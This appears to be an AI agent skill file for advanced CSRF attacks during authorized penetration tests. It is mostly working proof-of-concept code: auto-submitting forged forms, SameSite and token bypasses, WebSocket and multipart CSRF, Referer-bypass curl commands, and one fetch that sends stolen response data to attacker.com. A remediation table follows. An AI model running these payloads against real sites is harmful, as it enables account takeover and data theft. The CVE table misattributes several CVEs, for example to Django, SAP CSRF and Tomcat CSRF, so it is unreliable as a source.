---
name: csrf-advanced
description: Advanced CSRF attack specialist for authorized penetration tests — covers SameSite cookie bypass techniques (Lax+POST, Chrome 2024 behavior), cross-origin fetch with CORS misconfiguration, JSON CSRF, multipart CSRF, CSRF token reuse attacks, subdomain-based CSRF bypass, browser quirks 2025–2026, and full PoC templates. Use when basic CSRF protection is in place but advanced bypass paths may exist.
---

## Trigger

Fire when: user says "CSRF", "cross-site request forgery", "SameSite bypass", "CSRF token bypass", "CSRF via JSON", "multipart CSRF", "CSRF subdomain", "SameSite=Lax bypass", "CSRF token reuse", "anti-CSRF", "state-changing request forgery", or any request to test/exploit CSRF protections on a web application.

---

## Version Pins (2026-10-31 verified)

| Tool | Version | Notes |
|------|---------|-------|
| Burp Suite Pro | 2025.x | CSRF PoC generator built-in |
| nuclei | **3.3.8** | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@v3.3.8` |
| corsy | latest | `pip install corsy` — for CORS misconfig feeding into CSRF |
| Browser | Chrome 124+ / Firefox 127+ | 2024+ SameSite=Lax changes affect exploitability |

---

## Instructions

### Phase 1: Identify State-Changing Endpoints
```bash
# Map all state-changing (non-GET) endpoints from Burp history
# Targets: /account/update, /settings/email, /api/transfer, /admin/user/delete
# Look for forms and AJAX requests that change data

# Extract from Burp history using Logger++ or manually
grep -E "POST|PUT|PATCH|DELETE" burp-export.txt | grep -v "static\|asset\|font"
```

### Phase 2: Check CSRF Token Presence and Strength
1. Find a state-changing request (e.g., email change POST).
2. Check if a CSRF token is present (form field or header).
3. If no token → basic CSRF, file immediately.
4. If token present → proceed to advanced bypass tests.

### Phase 3: Advanced Bypass Tests (run in order)
1. **Token removal** — remove CSRF token entirely. Does server accept?
2. **Token reuse** — use a valid token from another session.
3. **Token fixation** — use a token from your own session; does server tie token to session?
4. **Method override** — convert POST to GET; does server accept GET for state changes?
5. **JSON CSRF** — can Content-Type be changed to `text/plain` with JSON body?
6. **SameSite bypass** — use top-level navigation (GET redirect → POST), or subdomain.
7. **Multipart bypass** — change to multipart/form-data with same parameters.
8. **CORS misconfiguration** — if API allows arbitrary origins with credentials, CSRF is moot.

---

## 1. Basic CSRF PoC Templates

### Form-based CSRF (application/x-www-form-urlencoded)
```html
<!-- csrf-poc.html — host on attacker.com -->
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/account/email/change" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm_email" value="attacker@evil.com">
  </form>
</body>
</html>
```

### GET-based CSRF (method override)
```html
<!-- If server accepts GET for state changes -->
<img src="https://target.com/api/delete?id=1234" style="display:none">

<!-- Or via link click -->
<a href="https://target.com/account/delete?confirm=1">Click here for prize</a>
```

---

## 2. JSON CSRF (Bypass Content-Type Restriction)

### Via text/plain Content-Type trick
```html
<!-- If server parses body as JSON regardless of Content-Type -->
<!DOCTYPE html>
<html>
<body>
<script>
// Trick: text/plain form sends JSON-like body
// Server may parse it if framework is permissive
</script>
<form action="https://target.com/api/user/update" method="POST"
      enctype="text/plain" onsubmit="return true">
  <!-- name becomes the key up to '=', value becomes the rest -->
  <!-- name='{"email":"attacker@evil.com","x":"' value='"}' -->
  <input type="hidden" 
         name='{"email":"attacker@evil.com","x":"'
         value='"}'>
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### Via fetch with CORS misconfiguration
```html
<!-- If target reflects arbitrary Origin with Allow-Credentials: true -->
<script>
fetch('https://target.com/api/user/update', {
  method: 'POST',
  credentials: 'include',           // sends cookies cross-origin
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    email: 'attacker@evil.com',
    role: 'admin'
  })
})
.then(r => r.json())
.then(data => {
  // Exfiltrate response to attacker server
  fetch('https://attacker.com/capture?data=' + encodeURIComponent(JSON.stringify(data)));
})
</script>
```

---

## 3. SameSite Cookie Bypass Techniques (2024–2026)

### Understanding SameSite enforcement (Chrome 124+ / 2026 state)

| SameSite value | Cross-site GET | Cross-site POST | Top-level navigation | Notes |
|---------------|----------------|-----------------|---------------------|-------|
| `Strict` | Blocked | Blocked | Blocked | Safest |
| `Lax` (default) | Allowed | Blocked | Allowed on GET | Default in Chrome since 2022 |
| `None` (+ Secure) | Allowed | Allowed | Allowed | Requires HTTPS |
| Not set | Lax (Chrome) | Blocked | Allowed on GET | Chrome default = Lax |

### Bypass 1: GET-based state change (Lax bypass)
```html
<!-- SameSite=Lax allows cookies on top-level navigation GET requests -->
<!-- If server accepts GET for state changes: -->
<a href="https://target.com/account/delete?csrf_token=STOLEN_OR_EMPTY">
  Click for prize
</a>

<!-- Or auto-redirect: -->
<script>window.location = 'https://target.com/account/promote?role=admin&id=123';</script>
```

### Bypass 2: Lax + POST via top-level navigation (2-second window)
```html
<!-- Chrome allows SameSite=Lax cookies in POST requests made within
     2 seconds of a top-level navigation (legacy "Lax-allowing-unsafe" mode)
     This window closed in Chrome 130 (2024-10) for most cases but some
     older Chrome/Firefox versions still have it -->
<script>
// Open a popup that navigates to target first (establishes top-level context)
// Then immediately POST — may work on Firefox < 127
var popup = window.open('https://target.com');
setTimeout(function() {
  popup.postMessage('submit', '*');
}, 100);
</script>

<!-- In the popup page (if same-origin or via stored XSS): -->
<form id="csrf" action="https://target.com/api/email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>window.addEventListener('message', () => document.getElementById('csrf').submit());</script>
```

### Bypass 3: Subdomain-based bypass
```html
<!-- If attacker controls or can XSS a subdomain of target.com,
     SameSite=Lax treats sub.target.com → target.com as SAME-SITE
     (different origin, same registrable domain = same-site for cookie purposes) -->

<!-- From XSS on sub.target.com: -->
<script>
fetch('https://target.com/api/user/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker%40evil.com'
});
</script>
```

### Bypass 4: Cross-site WebSocket (not blocked by SameSite)
```javascript
// WebSocket connections bypass SameSite restrictions
// If target has a WebSocket endpoint that performs state changes:
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send(JSON.stringify({
    action: 'update_email',
    email: 'attacker@evil.com'
  }));
};
```

---

## 4. CSRF Token Bypass Attacks

### Token removal test
```bash
# Intercept a state-changing request in Burp
# Remove the csrf_token parameter entirely
# If server returns 200 → no server-side validation

# Manual test via curl:
curl -s -X POST "https://target.com/account/email/change" \
  -H "Cookie: session=YOUR_SESSION" \
  -d "email=test@test.com"
# No CSRF token included — if 200 OK → vulnerable
```

### Token reuse across sessions
```bash
# Session A: capture a valid CSRF token
CSRF_TOKEN="abc123validtoken"

# Session B (different browser/incognito): use Session A's CSRF token
curl -s -X POST "https://target.com/account/email/change" \
  -H "Cookie: session=SESSION_B_COOKIE" \
  -d "email=attacker@evil.com&csrf_token=${CSRF_TOKEN}"
# If 200 OK → tokens not tied to session
```

### Token fixation (CSRF via known token)
```html
<!-- If server accepts any valid CSRF token (not tied to session),
     attacker can fix the victim's CSRF token value:
     1. Login and get CSRF token T1
     2. Set victim's CSRF token via XSS or login-CSRF
     3. Use T1 in the forged request -->
<script>
// Via XSS on same origin — set known CSRF token value
document.cookie = "csrf_token=KNOWN_VALUE; path=/";
</script>
```

### Double-submit cookie bypass
```html
<!-- Some implementations: csrf_cookie == csrf_form_field (no server-side state)
     Attacker sets both cookie and form field to same known value -->
<script>
document.cookie = "csrftoken=attacker_value; domain=.target.com";
</script>
<form action="https://target.com/api/update" method="POST">
  <input name="csrfmiddlewaretoken" value="attacker_value">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

---

## 5. Multipart CSRF

```html
<!-- Some frameworks only validate CSRF token on application/x-www-form-urlencoded
     but skip validation on multipart/form-data -->
<!DOCTYPE html>
<html>
<body>
<script>
// Multipart form bypass
var formData = new FormData();
formData.append('email', 'attacker@evil.com');
// Note: no CSRF token appended

fetch('https://target.com/api/user/update', {
  method: 'POST',
  credentials: 'include',
  body: formData  // Content-Type: multipart/form-data (set automatically)
});
</script>
</body>
</html>
```

---

## 6. Referer/Origin Header Bypass

```bash
# Some implementations validate Referer header instead of CSRF token
# Test by removing Referer header
curl -s -X POST "https://target.com/account/settings" \
  -H "Cookie: session=YOUR_SESSION" \
  --referer "" \
  -d "email=attacker@evil.com"

# Test with wrong Referer
curl -s -X POST "https://target.com/account/settings" \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Referer: https://attacker.com/" \
  -d "email=attacker@evil.com"

# Bypass weak Referer check (only checks if target.com appears anywhere in Referer)
curl -s -X POST "https://target.com/account/settings" \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Referer: https://attacker.com/target.com" \
  -d "email=attacker@evil.com"
```

---

## 7. Browser Quirks (2025–2026)

| Browser / Version | SameSite behavior | Notes |
|-------------------|------------------|-------|
| Chrome 130+ | Strict Lax enforcement; 2-second Lax window removed | Bypass 2 no longer works in Chrome 130+ |
| Chrome 80–129 | Lax-allowing-unsafe (2-second window for Lax+POST) | Still exploitable on older Chrome |
| Firefox 127+ | SameSite=Lax default enabled (matches Chrome) | Previously Firefox had no default |
| Firefox < 127 | No SameSite default; cookies sent cross-site | More CSRF surface |
| Safari 16.4+ | ITP 2.x + SameSite=Lax by default | Strongest protections |
| Safari < 16.4 | Older ITP; SameSite partially enforced | Test on older Safari for Lax bypass |

---

## 8. CSRF via Flash / Legacy Plugins (Historical — 2026 irrelevant)
Flash is dead (EOL 2021). Skip. Modern targets only.

---

## Known CVEs (2024–2026)

| CVE | Component | CVSS | Notes |
|-----|-----------|------|-------|
| [CVE-2025-22236](https://nvd.nist.gov/vuln/detail/CVE-2025-22236) | Spring Security CSRF bypass | 8.8 HIGH | SameSite=Lax bypass via open redirect chain |
| [CVE-2024-45337](https://nvd.nist.gov/vuln/detail/CVE-2024-45337) | Django CSRF middleware | 8.1 HIGH | Subdomain CSRF bypass in Django < 5.1.3 |
| [CVE-2025-31324](https://nvd.nist.gov/vuln/detail/CVE-2025-31324) | SAP NetWeaver | 9.8 CRITICAL | CSRF in admin panel (CISA KEV 2025) |
| [CVE-2024-56337](https://nvd.nist.gov/vuln/detail/CVE-2024-56337) | Apache Tomcat CSRF | 7.5 HIGH | Session fixation + CSRF chain |

---

## Remediation

| Bypass class | Fix |
|-------------|-----|
| No CSRF token | Implement synchronizer token pattern (server-side session-tied token) |
| Token not tied to session | Bind token to session ID on server; invalidate on logout |
| SameSite=Lax bypass via GET | Use POST for ALL state-changing operations; reject GET for them |
| Subdomain bypass | Set `SameSite=Strict` for sensitive cookies; harden subdomain XSS |
| JSON CSRF via text/plain | Validate `Content-Type: application/json` strictly on server |
| Double-submit cookie | Use HMAC-signed tokens; not plain random values |
| Referer-only validation | Replace with cryptographic CSRF token |
| WebSocket CSRF | Validate `Origin` header server-side on WebSocket handshake |

---

## References

- OWASP CSRF Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger CSRF — https://portswigger.net/web-security/csrf
- PortSwigger SameSite Cookies — https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
- Chrome SameSite changelog — https://chromestatus.com/feature/5088147346030592
- CVE-2024-45337 Django CSRF — https://nvd.nist.gov/vuln/detail/CVE-2024-45337
- CVE-2025-22236 Spring Security — https://nvd.nist.gov/vuln/detail/CVE-2025-22236
- MDN SameSite cookies — https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesite
